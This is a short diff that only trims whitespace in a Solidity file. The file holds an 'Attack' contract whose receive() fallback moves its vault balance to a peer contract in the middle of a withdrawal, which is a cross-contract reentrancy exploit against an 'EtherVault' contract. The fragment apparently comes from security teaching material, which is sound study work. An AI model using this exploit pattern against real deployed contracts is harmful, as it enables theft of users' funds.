@@ -15,7 +15,7 @@ interface IEtherVault {
     function transfer(address _to, uint256 _amount) external;
     function withdrawAll() external;
     function getUserBalance(address _user) external view returns (uint256);
-} 
+}
 
 contract Attack {
     IEtherVault public immutable etherVault;
@@ -28,11 +28,11 @@ contract Attack {
     function setAttackPeer(Attack _attackPeer) external {
         attackPeer = _attackPeer;
     }
-    
+
     receive() external payable {
         if (address(etherVault).balance >= 1 ether) {
             etherVault.transfer(
-                address(attackPeer), 
+                address(attackPeer),
                 etherVault.getUserBalance(address(this))
             );
         }
